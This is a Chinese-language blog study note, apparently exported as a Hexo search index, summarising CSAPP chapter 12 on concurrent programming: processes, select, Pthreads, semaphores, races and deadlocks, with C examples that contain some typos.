<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>CSAPP 第十二章 并发编程</title>
    <link href="/2023/12/26/CSAPP-%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/"/>
    <url>/2023/12/26/CSAPP-%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<p>构造并发程序和并发引起的问题</p><span id="more"></span><p>如果逻辑控制流在时间上重叠，那么它们就是并发的。</p><p>并发不仅仅局限于内核，它也可以在应用程序中扮演重要角色。应用级并发在其他情况下也是很有用的：</p><ul><li>访问慢速 I&#x2F;0 设备</li><li>与人交互</li><li>通过推迟工作以降低延迟</li><li>服务多个网络客户端</li><li>在多核机器上进行并行计算</li></ul><p>现代操作系统提供三种基本的构造并发程序的方法：进程、I&#x2F;O 多路复用、线程。</p><h1 id="基于进程的并发编程"><a href="#基于进程的并发编程" class="headerlink" title="基于进程的并发编程"></a>基于进程的并发编程</h1><p>构造并发程序最简单的方法就是用进程，使用 fork、exec 和 waitpid 等函数。一个构造并发服务器的自然方法就是，在父进程中接受客户端连接请求，然后创建一个新的子进程来为每个新客户端提供服务。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/12-%E8%BF%9B%E7%A8%8B%E5%B9%B6%E5%8F%911.png"></p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/12-%E8%BF%9B%E7%A8%8B%E5%B9%B6%E5%8F%912.png"></p><h3 id="基于进程的并发服务器"><a href="#基于进程的并发服务器" class="headerlink" title="基于进程的并发服务器"></a>基于进程的并发服务器</h3><p>服务器通常会运行很长的时间，这意味着操作系统不会帮助进程回收内存，我们需要做到以下几点：</p><ul><li>包括一个 SIGCHLD 处理程序来回收僵死进程，因为 Linux 的信号是不排队的，所以说一次要处理完所有的子进程。</li><li>对于父进程，需要在 fork 之后马上 close 建立连接的描述符，对于子进程来说，也要关闭所有的文件描述符。</li></ul><h3 id="进程的优劣"><a href="#进程的优劣" class="headerlink" title="进程的优劣"></a>进程的优劣</h3><p>进程共享文件表，但是不共享用户地址空间（这既是优点也是缺点），不会发生内存覆盖的情况，但是也造成了通信困难。</p><p>为了通信，需要使用 IPC（进程间通信）机制，但它通常比较慢。</p><h1 id="基于-I-x2F-O-多路复用的并发编程"><a href="#基于-I-x2F-O-多路复用的并发编程" class="headerlink" title="基于 I&#x2F;O 多路复用的并发编程"></a>基于 I&#x2F;O 多路复用的并发编程</h1><p>如果我们同时响应这两个 I&#x2F;O 事件： 1) 网络客户端发起连接请求，2) 用户在键盘上键人命令行。那我们该先响应哪一个呢？。如果在 accept 中等待一个连接请求，我们就不能响应输入的命令。类似地，如果在 read中<br>等待一个输人命令，我们就不能响应任何连接请求。</p><p>针对这种困境的一个解决办法就是 <strong>I&#x2F;O 多路复用技术</strong>。基本的思路就是使用 select 函数，要求内核挂起进程，只有在一个或多个 I&#x2F;O 事件发生后，才将控制返回给应用程序，</p><p>例如下面的示例：</p><blockquote><p>select 是一个复杂的函数，有许多不同的使用场景。我们只讨论第一种场景：等待一组描述符准备好读。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/select.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">select</span><span class="hljs-params">(<span class="hljs-type">int</span> n, fd_set *fdset, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>)</span>;<br><span class="hljs-comment">// 返回已准备好的描述符的非零的个数，若出错则为 -1。</span><br><br>FD_ZERO(fd_set *fdset);           <span class="hljs-comment">/* Clear all bits in fdset */</span><br>FD_CLR(<span class="hljs-type">int</span> fd, fd_set *fdset);    <span class="hljs-comment">/* Clear bit fd in fdset */</span><br>FD_SET(<span class="hljs-type">int</span> fd, fd_set *fdset);    <span class="hljs-comment">/* Turn on bit fd in fdset */</span><br>FD_ISSET(<span class="hljs-type">int</span> fd, fd_set *fdset);  <span class="hljs-comment">/* Is bit fd in fdset on? */</span><br><span class="hljs-comment">// 处理描述符集合的宏。</span><br></code></pre></td></tr></table></figure><p>select 函数处理类型为 <code>fd_set</code> 的集合，也叫做描述符集合。逻辑上，我们将描述符集合看成一个大小为 n 的位向量 $$b_n$$ 。<strong>当且仅当 $$b_k$$&#x3D;1，描述符才表明是描述符集合的一个元素。</strong></p><p>这个函数只允许对描述符集合做三件事：1) 分配它们，2) 将一个此种类型的变量赋值给另一个变量，3) 用 FD ZERO、FD SET、FD CLR 和 FD ISSET 宏来修改和检查它们。</p><p>针对我们的目的，select 函数有两个输人：一个称为读集合的**描述符集合(fd_set)<strong>和该读集合的</strong>基数(n)**（实际上是任何描述符集合的最大基数）。select 函数会一直阻塞，直到读集合中至少有一个描述符准备好可以读。当且仅当一个从该描述符读取一个字节的请求不会阻塞时，描述符 k 就表示准备好可以读了。</p><p>我们看下面的例子：</p><p>假设有两个文件 fd1、fd2，我要实现当某个描述符准备时进行读取对应的文件。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;sys/select.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;unistd.h&gt;</span></span><br>fd_set readset，ready_set;<br>FD_CLR(&amp;readset);<br>FD_SET(fd1,&amp;readset);<br>FD_SET(fd2,&amp;readset);<br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)<br>&#123;<br>    ready_set = readset;<span class="hljs-comment">//每次需要重新赋值一遍</span><br>    select(listenfd + <span class="hljs-number">1</span>, &amp;readset, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span>(FD_ISSET(fd1,&amp;readset))<br>    &#123;<br>        read(fd1,buffer,<span class="hljs-number">0x100</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(FD_ISSET(fd2),&amp;readset)<br>    &#123;<br>        read(fd2,buffer,<span class="hljs-number">0x100</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果两个都没有准备好，就会阻塞了。</p><p><del>接下来的小节讲了一个实例，略🤪</del></p><h3 id="I-x2F-O-多路复用技术的优劣"><a href="#I-x2F-O-多路复用技术的优劣" class="headerlink" title="I&#x2F;O 多路复用技术的优劣"></a>I&#x2F;O 多路复用技术的优劣</h3><p>优点：</p><p>调试方便，每个逻辑流都能访问该进程的全部地址空间，且不需要上下文切换。</p><p>缺点：</p><p>如果面对网络延迟较高的用户，那么这个用户会阻塞整个服务，甚至会有恶意用户故意只发送部分文本行，导致整个服务被阻塞。</p><h1 id="基于线程的并发编程"><a href="#基于线程的并发编程" class="headerlink" title="基于线程的并发编程"></a>基于线程的并发编程</h1><p>线程就是运行在进程上下文中的逻辑流。线程由内核自动调度，每个线程都有它自己的线程上下文，包括一个唯一的整数线程 ID、栈、栈指针、程序计数器、通用目的寄存器和条件码。所有的运行在一个进程里的线程共享该进程的整个虚拟地址空间。</p><h3 id="线程执行模型"><a href="#线程执行模型" class="headerlink" title="线程执行模型"></a>线程执行模型</h3><p>每个进程开始的时候都是一个单一线程，就是主线程。在某一时刻，主线程创建一个<strong>对等线程</strong>（peer thread），从这个时间点开始，两个线程就并发地运行。最后，因为主线程执行一个慢速系统调用，例如 read 或者 sleep，或者因为被系统的间隔计时器中断，控制就会通过上下文切换传递到对等线程。对等线程会执行一段时间，然后控制传递回主线程，依次类推。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/12-%E5%B9%B6%E5%8F%91%E7%BA%BF%E7%A8%8B.png"></p><p>线程的上下文切换速度比进程要快的多，因为线程大部分数据是共享的。同时，线程不像进程那样有严格的父子层次关系。<strong>和一个进程相关的线程组成一个对等(线程)池，独立于其他线程创建的线程。</strong>主线程和其他线程的区别仅在于它总是进程中第一个运行的线程。</p><p>对等(线程)池概念的主要影响是，一个线程可以杀死它的任何对等线程，或者等待它的任意对等线程终止。</p><h3 id="POSIX-线程"><a href="#POSIX-线程" class="headerlink" title="POSIX 线程"></a>POSIX 线程</h3><p>Posix 线程（Pthreads）就是在 C 程序中处理线程的一个标准接口。Pthreads 定义了大约 60个函数，允许程序创建杀死和回收线程，与对等线程安全地共享数据，还可以通知对等线程系统状态的变化。</p><h3 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h3><p>线程通过 <code>pthread_create</code> 函数来创建其他线程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">void</span> *(func)(<span class="hljs-type">void</span> *);<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_create</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> *tid, <span class="hljs-type">pthread_attr_t</span> *attr,</span><br><span class="hljs-params">                   func *f, <span class="hljs-type">void</span> *arg)</span>;<br><span class="hljs-comment">// 若成功则返回 0，若出错则为非零。</span><br></code></pre></td></tr></table></figure><p><code>pthread_create</code> 函数创建一个新的线程，并带着一个输入变量 <em>arq</em>，在新线程的上下文中运行线程例程 <em>f</em> 。能用 <em>attr</em> 参数来改变新创建线程的默认属性。</p><p>当 <code>pthread_create</code> 返回时，参数 <em>tid</em> 包含新创建线程的 ID。新线程可以通过调用 <code>pthread_self</code> 函数来获得它自己的线程 ID 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">pthread_t</span> <span class="hljs-title function_">pthread_self</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-comment">//返回调用者的线程 ID。</span><br></code></pre></td></tr></table></figure><h3 id="终止线程"><a href="#终止线程" class="headerlink" title="终止线程"></a>终止线程</h3><p>一个线程是以下列方式之一来终止的：</p><ul><li>当顶层的线程例程返回时，线程会隐式地终止。</li><li>通过调用 <code>pthread_exit</code> 函数，线程会显式地终止。如果主线程调用 <code>pthread_exit</code>，它会等待所有其他对等线程终止，然后再终止主线程和整个进程，返回值为 thread_return 。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">pthread_exit</span><span class="hljs-params">(<span class="hljs-type">void</span> *thread_return)</span>;<br><span class="hljs-comment">//从不返回。</span><br></code></pre></td></tr></table></figure><ul><li>某个对等线程调用 Linux 的 <code>exit</code> 函数，该函数终止进程以及所有与该进程相关的线程。</li><li>另一个对等线程通过以当前线 ID 作为参数调用 <code>pthread_cancel</code> 函数来终止当前线程。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_cancel</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> tid)</span>;<br><span class="hljs-comment">//若成功则返回0，若出错则为非零。</span><br></code></pre></td></tr></table></figure><h3 id="回收已终止线程的资源"><a href="#回收已终止线程的资源" class="headerlink" title="回收已终止线程的资源"></a>回收已终止线程的资源</h3><p>线程通过调用 <code>pthread_join</code> 函数等待其他线程终止。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_join</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> tid, <span class="hljs-type">void</span> **thread_return)</span>;<br><span class="hljs-comment">//若成功则返回 0，若出错则为非零。</span><br></code></pre></td></tr></table></figure><p><code>pthread_join</code> 函数会阻塞，直到线程 <em>tid</em> 终止，将线程例程返回的通用 <em>(void*)</em> 指针赋值为 <em>thread_return</em> 指向的位置，然后回收已终止线程占用的所有内存资源。</p><p>需要注意的是，和 Linux 的 <code>wait</code> 函数不同，**<code>pthread_join</code> 函数只能等待一个指定的线程终止，没有办法让 <code>pthread_wait</code> 等待任意一个线程终止。**</p><h3 id="分离线程"><a href="#分离线程" class="headerlink" title="分离线程"></a>分离线程</h3><p>在任何一个时间点上，线程是<strong>可结合的</strong>（joinable）或者是<strong>分离的</strong>（detached）。一个可结合的线程能够被其他线程收回和杀死。在被其他线程回收之前，它的内存资源（例如栈）是不释放的。一个分离的线程是不能被其他线程回收或杀死的。它的内存资源在它终止时由系统自动释放。</p><p>为了避免内存泄露，线程创建就是可结合的。每个可结合线程都应该要么被其他线程显示的回收，或者使用 <code>pthread_detach</code> 函数去分离。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread,h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_detach</span><span class="hljs-params">(<span class="hljs-type">pthread_t</span> tid)</span>;<br><span class="hljs-comment">//若成功则返回 0，若出错则为非客</span><br></code></pre></td></tr></table></figure><p>对于一些 web 服务器，我们就可以分离线程让主线程不必等待，等到线程自己执行完毕后等待系统回收内存资源。</p><h3 id="初始化线程"><a href="#初始化线程" class="headerlink" title="初始化线程"></a>初始化线程</h3><p>pthread_once 函数允许你初始化与线程例程相关的状态。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><br><span class="hljs-type">pthread_once_t</span> once_control = PTHREAD_ONCE_INIT;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pthread_once</span><span class="hljs-params">(<span class="hljs-type">pthread_once_t</span> *once_control,<span class="hljs-type">void</span> (*init_routine)(<span class="hljs-type">void</span>))</span>;<br><span class="hljs-comment">// 总是返回 0。</span><br></code></pre></td></tr></table></figure><p>当你第一次用参数 once_control 调用 <code>pthread_once</code> 时，它调用 <code>init_routine</code>，这是一个没有输人参数、也不返回什么的函数。接下来的以 once_control 为参数的 <code>pthread_once</code> 调用不做任何事情。</p><p>当我们需要动态初始化多个线程共享的全局变量时，<code>pthread_once</code> 函数是很有用的。</p><h3 id="基于线程的并发服务器"><a href="#基于线程的并发服务器" class="headerlink" title="基于线程的并发服务器"></a>基于线程的并发服务器</h3><p>在 accept 请求时会返回一个连接描述符，假如在线程中还没有拿这个值，此时主线程下一个 accept 已经到来。就会导致这个线程取出了一个错误的描述符。这就导致了一个<strong>竞争</strong>的危险。</p><h1 id="多线程程序中的共享变量"><a href="#多线程程序中的共享变量" class="headerlink" title="多线程程序中的共享变量"></a>多线程程序中的共享变量</h1><p>主要就是在讲线程中什么变量是共享的</p><h3 id="线程内存模型"><a href="#线程内存模型" class="headerlink" title="线程内存模型"></a>线程内存模型</h3><p>寄存器是不共享的，但是虚拟内存是共享的。它们的栈说是独立的，其实也可以是共享的，只要知道内存地址，便可以轻松访问其它线程的栈，</p><h3 id="将变量映射到内存"><a href="#将变量映射到内存" class="headerlink" title="将变量映射到内存"></a>将变量映射到内存</h3><p>多线程中的C 程序的变量根据它们的存储类型被映射到虚拟内存：</p><ul><li>全局变量，在 bss 或者 data 段上。</li><li>本地变量，在栈或者是寄存器上。</li><li>本地静态变量，在 bss 或者 data 段上。</li></ul><h4 id="共享变量"><a href="#共享变量" class="headerlink" title="共享变量"></a>共享变量</h4><p>我们说一个变量 “是共享的，当且仅当它的<strong>一个实例被一个以上的线程引用。</strong></p><h1 id="用信号量同步线程"><a href="#用信号量同步线程" class="headerlink" title="用信号量同步线程"></a>用信号量同步线程</h1><p>共享变量引入了同步错误的可能性。</p><p>例如，多线程执行 <code>cnt++</code> ，我们预测最终的结果是每个线程做加法的和，但实际上并不是相加的次数。</p><p>我们需要了解一下执行计数的这一句代码，它在汇编层面被分成了三步：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">movq cnt(%rip),%rdx<br>addq$1,%rdx<br>movq%rdx,cnt(%rip)<br></code></pre></td></tr></table></figure><p>我们知道，多线程同时运行时，并不能保证这个 <code>cnt++</code> 代码完整的执行完以后才转换到另一个线程。可能发生这种情况：线程 1 从内存中取值，正在进行 add 操作，但并没有返回内存。这时线程 2 从内存中取值，取到的值还是线程 1 没有处理过的值，所以这两个线程分别进行加一的操作并存储回内存，得到的结果只是加了一次，就出现了错误。</p><h3 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h3><p><strong>信号量 s 是具有非负整数值的全局变量</strong>，只能由两种特殊的操作来处理，这两种操作称为 P和V：</p><ul><li>P(s)：如果 s 是非零的，那么 P 将减 1，并且立即返回。如果为零，那么就挂起这个线程，直到 s 变为非零，而一个V 操作会重启这个线。在重启之后，P 操作将 s 减 1，并将控制返回给调用者。</li><li>V(s):：V 操作将 s 加 1。如果有任何线程阻塞在 P 操作等待变成非零，那么 V 操作会重启这些线程中的一个，然后该线程将 s 减 1，完成它的 P 操作。</li></ul><h3 id="使用信号量来实现互斥"><a href="#使用信号量来实现互斥" class="headerlink" title="使用信号量来实现互斥"></a>使用信号量来实现互斥</h3><p>将每个共享变量（或者一组相关的共享变量）与一个信号量 s（初始为 1）联系起来，然后用 <code>P(s)</code> 和 <code>V(s)</code> 操作将相应的临界区包围起来。以这种方式来保护共享变量的信号量叫做二元信号量（binary semaphore），因为它的值总是 0 或者 1。</p><p>以提供互斥为目的的二元信号量常常也称为互斥锁（mutex）。在一个互斥锁上执行 P 操作称为<strong>对互斥锁加锁</strong>。类似地，执行 V 操作称为<strong>对互斥锁解锁</strong>。对一个互斥锁加了锁但是还没有解锁的线程称为<strong>占用这个互斥锁</strong>。</p><h3 id="使用信号量来调度共享资源"><a href="#使用信号量来调度共享资源" class="headerlink" title="使用信号量来调度共享资源"></a>使用信号量来调度共享资源</h3><blockquote><p>实现我真的看不懂我就写写问题原理啥的剩下的再补，也可能不会补(x</p></blockquote><p>信号量调度对共享资源的访问。在这种场景中，一个线程用信号量操作来通知另一个线程，程序状态中的某个条件已经为真了。</p><p>两个经典的例子是生产者-消费者和读者-写者问题。</p><h4 id="生产者-消费者"><a href="#生产者-消费者" class="headerlink" title="生产者-消费者"></a>生产者-消费者</h4><p>这个例子是很形象的，生产者和消费者线程共享一个有 n 个槽的有限缓冲区。生产者线程反复地生成新的项目，并把它们插入到缓冲区中。消费者线程不断地从缓冲区中取出这些项目，然后消费(使用)它们。</p><p>我们必须保证对缓冲区的访问是互斥的，还需要调度对缓冲区的访问。如果缓冲区是满的，那么生产者必须等待直到有一个槽位变为可用。与之相似，如果缓冲区是空的，那么消费者必须等待直到有一个项目变为可用。</p><p>生产者和消费者共用一个信号量，同时也共用锁。</p><h4 id="读者-写者"><a href="#读者-写者" class="headerlink" title="读者-写者"></a>读者-写者</h4><p>修改对象的线程叫做写者。只读对象的线程叫做读者。写者必须拥有对对象的独占的访问，而读者可以和无限多个其他的读者共享对象。一般来说，有无限多个并发的读者和写者。</p><p>例如我们抢演唱会门票，我和另一个人选了同一个座位，点进去的时候显示是有票（读数据库）。这时我结算订单比她快（写数据库），她付款的时候就会显示没票。</p><p>这个问题分读者有限和写者优先两种方案。</p><h1 id="其他并发问题"><a href="#其他并发问题" class="headerlink" title="其他并发问题"></a>其他并发问题</h1><h3 id="线程安全"><a href="#线程安全" class="headerlink" title="线程安全"></a>线程安全</h3><p>一个函数被称为线程安全的，当且仅当<strong>被多个并发线程反复地调用时，它会一直产生正确的结果</strong>。如果一个函数不是线程安全的，我们就说它是线程不安全的。</p><p>以下四种函数被认为是不安全的：</p><ul><li>不保护共享变量的函数</li><li>保持跨越多个调用状态的函数</li><li>返回指向静态变量的指针的函数</li><li>调用线程不安全函数的函数</li></ul><p>处理线程不安全函数有两种方法：1）重写函数 ，2）使用加锁 - 复制技术</p><h3 id="竞争和死锁"><a href="#竞争和死锁" class="headerlink" title="竞争和死锁"></a>竞争和死锁</h3><h4 id="竞争"><a href="#竞争" class="headerlink" title="竞争"></a>竞争</h4><p><strong>当一个程序的正确性依赖于一个线程 a 要在另一个线程 b 到达 $$y_b$$点之前到达它的控制流中的 $$z_x$$ 点时，就会发生竞争（race）</strong>。通常发生竞争是因为程序员假定线程将按照某种特殊的轨迹线穿过执行状态空间，而忘记了另一条准则规定：多线程的程序必须对任何可行的轨迹线都正确工作。</p><p>例如下面的实例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N 4</span><br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *vargp)</span><br>&#123;<br>    <span class="hljs-type">int</span> myid=*((<span class="hljs-type">int</span> *)vargp);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello from thread %d\n&quot;</span>,myid);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">pthread_t</span> tid[N];<br>    <span class="hljs-type">int</span> i;<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N; i++) &#123; <br>        pthread_create(&amp;tid[i], <span class="hljs-literal">NULL</span>, thread, &amp;i);<br>    &#125;<br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; N; i++) &#123;<br>        pthread_join(tid[i], <span class="hljs-literal">NULL</span>); <br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们理想的状态是依次输出 ID 0，1，2，3。但实际上的运行结果如下：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E4%BA%8C%E7%AB%A0-%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B/12-race.png"></p><p>这就是由每个对等线程和主线程之间的竞争引起的。</p><p>代码中的两个 for 循环中，第一个 for 循环传递了一个指向本地栈变量的指针。在下一次 for 循环对 i 加1和<code>*thread</code> 参数的间接引用和赋值之间就发生了竞争。如果对等线程在主线程执行对加1之前就执行了 <code>*thread</code> ，那么 myid 变量就得到正确的 ID。否则，它包含的就会是其他线程的 ID。</p><p>解决方案就是为每个整数 ID 分配一个独立的快，并传递给线租例程一个指向这个块的指针。如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N 4</span><br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *vargp)</span><br>&#123;<br>    <span class="hljs-type">int</span> myid = *((<span class="hljs-type">int</span> *)vargp);<br>    <span class="hljs-built_in">free</span>(vargp);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello from thread %d\n&quot;</span>，myid);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">pthread_t</span> tid[N];<br>    <span class="hljs-type">int</span> i,*ptr;<br>    <br>    <span class="hljs-keyword">for</span> (i =<span class="hljs-number">0</span>;i&lt;N;i++) <br>    &#123;<br>        ptr = Malloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>));<br>        *ptr = i;<br>        pthread_create(&amp;tid[i],<span class="hljs-literal">NULL</span>，thread,ptr);<br>    &#125;<br>    <br>    <span class="hljs-keyword">for</span> (i=<span class="hljs-number">0</span>;i&lt;N;i++)<br>    &#123;<br>        pthread_join(tid[i]，<span class="hljs-literal">NULL</span>);<br>    &#125;<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h4><p>死锁就是指一组线程被阻塞了，等待一个永远也不会为真的条件。</p><p>比较糟糕的是，死锁错误不可预测，且错误不可重读，因为每一不同的执行都有不同的轨迹线。很有可能我们执行很多次测试都没有出现问题，最后交给上面领导运行一下就死锁了。</p><p>当使用二元信号量来实现互斥时，我们可以应用互斥锁加锁顺序规则来避免死锁。</p><p>互斥锁加锁顺序规则： 给定所有互斥操作的一个全序，如果每个线程都是以一种顺序获得互斥锁并以相反的顺序释放，那么这个程序就是无死锁的。</p><hr><p>大板砖 overover !!</p><p>明天去杭电吃饭！</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP，并发编程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP 第十一章 网络编程</title>
    <link href="/2023/12/25/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    <url>/2023/12/25/CSAPP-%E7%AC%AC%E5%8D%81%E4%B8%80%E7%AB%A0-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
    
